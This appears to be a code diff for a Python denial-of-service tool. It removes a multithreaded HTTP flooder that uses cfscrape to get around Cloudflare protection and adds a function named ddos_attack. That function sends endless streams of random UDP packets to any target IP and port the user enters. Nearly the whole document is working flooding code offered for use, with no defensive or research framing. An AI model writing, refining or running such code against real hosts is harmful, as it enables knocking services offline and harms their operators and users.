@@ -1,38 +1,16 @@
-import cfscrape
-import requests
-import threading
+import socket
+import random
+import time
 
-# Function to send HTTP requests using Cloudflare bypass
-def send_request(target_url):
-    scraper = cfscrape.create_scraper()
+def ddos_attack(target_ip, target_port):
     while True:
-        try:
-            response = scraper.get(target_url)
-            print(f"Sent request to {target_url} - Status Code: {response.status_code}")
-        except Exception as e:
-            print(f"Error sending request: {e}")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1024)
+        sock.sendto(bytes, (target_ip, target_port))
+        print(f"Attacking {target_ip} on port {target_port} with {len(bytes)} bytes")
+        time.sleep(0.01)
 
-# Get user input for target IP address and port number
-target_ip = input("Enter the target IP address: ")
-target_port = input("Enter the target port number: ")
-
-# Construct the target URL
-target_url = f"http://{target_ip}:{target_port}"
-
-# Number of threads to use for the DDoS attack
-num_threads = 10
-
-# Create threads to send multiple requests simultaneously
-threads = []
-for _ in range(num_threads):
-    thread = threading.Thread(target=send_request, args=(target_url,))
-    thread.daemon = True
-    threads.append(thread)
-
-# Start the threads
-for thread in threads:
-    thread.start()
-
-# Wait for all threads to complete
-for thread in threads:
-    thread.join()
+if __name__ == "__main__":
+    target_ip = input("Enter the target IP: ")
+    target_port = int(input("Enter the target port: "))
+    ddos_attack(target_ip, target_port)
